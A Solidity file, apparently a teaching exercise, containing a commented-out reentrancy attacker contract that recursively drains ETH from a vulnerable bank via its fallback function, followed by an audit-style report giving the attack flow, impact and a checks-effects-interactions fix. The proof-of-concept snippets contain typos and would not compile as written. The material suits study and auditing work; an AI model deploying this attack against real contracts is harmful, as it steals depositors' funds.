// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Reentrancy Attacker Contract
CONCEPT: Recursive ETH drain
=========================================================

WARNING:
This is an EDUCATIONAL ATTACK DEMO ONLY.

Do NOT deploy against real contracts.
=========================================================
*/
/*
interface IVulnerableBank {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}
*/
/*
=========================================================
ATTACK CONTRACT
=========================================================
*/
/*
contract ReentrancyAttacker {

    IVulnerableBank public bank;
    address public owner;

    uint256 public attackAmount;
    bool public attacking;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    

    function attack() external payable {
        require(msg.sender == owner, "Only owner");

        /*
            Store attack amount
        
        attackAmount = msg.value;

        /*
            Step 1:
            Deposit ETH into vulnerable bank
        
        bank.deposit{value: msg.value}();

        /*
            Step 2:
            Start withdrawal (triggers reentrancy)
        
        attacking = true;
        bank.withdraw(msg.value);
        attacking = false;
    }

    /*
    =====================================================
    FALLBACK FUNCTION (REENTRANCY POINT)
    =====================================================
    

    fallback() external payable {

        /*
        =================================================
        CRITICAL REENTRANCY LOOP
        =================================================

        This runs when bank sends ETH back.

        BEFORE bank updates balance,
        attacker re-enters withdraw().
        

        if (attacking) {

            uint256 bankBalance =
                address(bank).balance;

            /*
                Continue attacking while bank has funds.
            
            if (bankBalance >= attackAmount) {

                bank.withdraw(attackAmount);
            }
        }
    }

    /*
    =====================================================
    COLLECT STOLEN ETH
    =====================================================
    

    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");

        payable(owner).transfer(address(this).balance);
    }

    /*
    =====================================================
    VIEW CONTRACT BALANCE
    =====================================================
    

    function getBalance()
        external
        view
        returns (uint256)
    {
        return address(this).balance;
    }
}
*/
/*
Audit Report
Title
Reentrancy Attack Contract Exploiting VulnerableBank

Severity: Critical

Reason
The attacker contract recursively re-enters the vulnerable banks withdraw() function
before the victim updates its internal balance, allowing repeated withdrawls from a 
single deposit

Location
Contract:ReentrancyAttacker
Functions: attack(),fallback()
Affected Victim Contract: VulnerableBank.withdraw()

Vulnerability Description
The attack contract exploits the following vulnerable flow in the bank:
(bool success, ) =
msg.sender,call{value: amount}("");
balance[msg.sender] -= amount;

when the bank sends ETH to the attacker, the attacker's fallback() function
executes before the balance is updated.
fallback() external payable {
    if (attacking) {
        bank.withdraw(attackAmount);
    }
}
This allows recursive withrawls using the same deposited balance.

Attack Flow
Step 1
Attacker deploys:
RentrancyAttacker(bankAddress)

Step 2
Attacker starts attack:
attack{value: 1 ether}()

Step 3
Attack contracts deposits ETH:
bank.deposite{value: 1 ether}();

Step 4
Attack contract calls:
bank.withdraw(1 ether);

Step 5
Victim sends ETH back:
msg.sender.call{value: amount}("");

Step 6
Fallback executes:
fallback() external payable

Step 7
Fallback re-enters:
bank.withdraw(attackAmount);

Step 8
Process repeats until:
address(bank).balance < attackAmount

Impact
- Complete drainage of victim contract ETH
- Theft of funds belonging to other users
- Loss of protocol liquidity
- Financial loss for all depositors

Root Cause
The victim contract updates balances after an external call:
External Call -> State Update
instead of:
State Update -> External Call
The attacker leverages this ordering flaw through recursive execution in fallback()

Proof of concept
Attacker code:
function attack()
external
payable
{
bank.deposite{value: msg.value}();
attacking = true;
bank.withdraw(msg.value);
}
Reentrancy trigger.
fallback()
external
payble
{
if (
    attacking &&
    address(bank).balance >= attackAmount
    ){
        bank.withdraw(
            attakAmount
        );
    }
}

Recommendation
Apply the checks-effects-interaction pattern:
balance[msg.sender] -= amount;
(bool success, ) =
msg.sender.call{value: amount}("");
Additionallu:
-Use a reentrancy guard(nonReentrant)
- Minimize external calls
- Consider pull-payment patterns



*/